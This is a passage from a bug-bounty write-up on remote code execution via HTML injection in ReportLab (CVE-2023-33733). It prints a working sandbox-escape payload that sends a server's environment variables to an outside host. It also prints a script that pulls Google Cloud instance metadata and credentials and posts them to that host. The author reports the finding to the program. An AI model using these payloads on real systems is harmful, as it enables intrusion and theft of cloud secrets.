</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">"[ [ [ [ ftype(ctype(0, 0, 0, 0, 3, 67, b't\\x00d\\x01\\x83\\x01\\xa0\\x01d\\x02\\xa1\\x01\\x01\\x00d\\x00S\\x00', (None, 'os', 'echo cHl0aG9uMyAtYyAiaW1wb3J0IHJlcXVlc3RzO3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9lbjJjZWxyN3Jld2J1bC5tLnBpcGVkcmVhbS5uZXQvJChjYXQgL3Byb2Mvc2VsZi9lbnZpcm9uKScpIg== | base64 -d|bash'), ('__import__', 'system'), (), '&lt;stdin&gt;', '', 1, b'\\x12\\x01'), {})() for ftype in [type(lambda: None)] ] for ctype in [type(getattr(lambda: {None}, Word('__code__')))] ] for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'"</span><span class="nt">&gt;</span>exploit<span class="nt">&lt;/font&gt;</span>
</code></pre></div></div>

<p>The content of /proc/self/environ were really really sensitive , I submitted the report at this moment. As this server responsible for generating pdfs was hosted on Google Cloud , I could even fetch Metadata response also.</p>

<p>To confirm this I used the below payload:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;import base64;metadata_url = 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true';metadata_headers = {'Metadata-Flavor': 'Google'};response = requests.get(metadata_url, headers=metadata_headers);encoded_metadata = base64.b64encode(response.text.encode()).decode();target_server_url = 'https://en2celq7rewbul.m.pipedream.net/';data_payload = {'metadata': encoded_metadata};requests.post(target_server_url, json=data_payload)"</span>
</code></pre></div></div>

<p>Beautified one line code for you :)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="n">metadata_url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://169.254.169.254/computeMetadata/v1/instance/?recursive=true</span><span class="sh">'</span>

<span class="n">metadata_headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">Metadata-Flavor</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Google</span><span class="sh">'</span><span class="p">}</span> <span class="c1"># custom metadata header requirement we have RCE so we could add it easily ;)
</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">metadata_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">metadata_headers</span><span class="p">)</span>

<span class="n">encoded_metadata</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>

<span class="n">target_server_url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https://en2celq7rewbul.m.pipedream.net/</span><span class="sh">'</span>

<span class="n">data_payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">metadata</span><span class="sh">'</span><span class="p">:</span> <span class="n">encoded_metadata</span><span class="p">}</span>

<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">target_server_url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data_payload</span><span class="p">)</span>
</code></pre></div></div>

<p>The above code basically makes a request to the Google cloud Metadata Endpoint then sends the json response to my server (which is base64 encoded), at last I also confirmed if I could fetch access_token for the used serviceAccount.</p>

<p>After confirming all this I ceased my testing and reported everything to the program.</p>

<p>The program was really happy with the report, although their maximum payout was 3k they still paid this 4.5k for this bug</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/b501f9f9-57f4-4138-8984-23ea6e981ec9" alt="image" /></p>

  </div><a class="u-url" href="/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">GitHub User</li>
          <li><a class="u-email" href="mailto:your-email@domain.com">your-email@domain.com</a></li>
        </ul>
      </div>
      <div class="footer-col">
        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
